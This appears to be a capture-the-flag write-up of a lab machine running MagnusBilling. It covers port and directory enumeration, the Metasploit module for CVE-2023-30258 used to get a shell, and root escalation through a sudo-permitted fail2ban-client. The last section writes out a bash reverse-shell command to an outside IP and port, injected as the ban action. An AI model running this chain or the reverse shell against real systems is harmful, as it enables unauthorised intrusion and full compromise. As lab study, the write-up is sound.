---
tags:
  - Fail2ban
  - sudo
  - CVE
---


## Enumeration
```sh
PORT      STATE    SERVICE        REASON         VERSION
22/tcp    open     ssh            syn-ack ttl 61 OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey:
|   256 06:bd:98:00:c3:67:cc:7c:99:5f:65:08:43:20:0f:f5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDAktFtu0LVxXH2ODPu3WE6oy7TkgAzaWPS07oWWvNgM46CE9yW6lczpx+KoFT+TUILfH2haygRFKf85/D+LkYw=
|   256 01:28:de:aa:23:22:b3:43:02:b4:9b:ee:6d:c1:aa:ec (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDjVhOoUSq3mwNXh5V5Xz00IEsZxVIgL3hZwVbwPGXUR
80/tcp    open     http           syn-ack ttl 61 Apache httpd 2.4.62 ((Debian))
| http-title:             MagnusBilling
|_Requested resource was http://10.10.115.13/mbilling/
| http-methods:
|_  Supported Methods: HEAD OPTIONS
3306/tcp  open     mysql          syn-ack ttl 61 MariaDB (unauthorized)
```

### Enumerate webapp

```
/mbilling/
```

```sh
/mbilling/

resources               [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 565ms] # empty
archive                 [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 4585ms] # empty
assets                  [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 570ms] # empty
lib                     [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 1513ms]
tmp                     [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 558ms]
LICENSE                 [Status: 200, Size: 7652, Words: 1404, Lines: 166, Duration: 1603ms]
protected               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 552ms]
```

After looking at the main website, we found its CMS called: `magnusbilling`, using CVE in metasploit.
```sh
linux/http/magnusbilling_unauth_rce_cve_2023_30258  # we got shell
```

looking at `/etc/passwd`
```sh
root:x:0:0:root:/root:/bin/bash
magnus:x:1000:1000:magnus,,,:/home/magnus:/bin/bash
mysql:x:118:126:MySQL Server,,,:/nonexistent:/bin/false
gnome-initial-setup:x:121:65534::/run/gnome-initial-setup/:/bin/false
debian:x:1003:1003:Debian:/home/debian:/bin/bash
```

---

looking at our `sudo -l`
```sh
sudo -l

Matching Defaults entries for asterisk on ip-10-10-40-150:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on ip-10-10-40-150:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

We can run `fail2ban-client`, which is program used to block IP address when doing wrong login attempts.
```sh
# Trigger reverse shell when blocking someone.
sudo fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'bash -i >& /dev/tcp/10.4.104.91/4441 0>&1'"

# Manual ban, "Manual Trigger for exploit"
sudo fail2ban-client set sshd banip 127.0.0.2
```
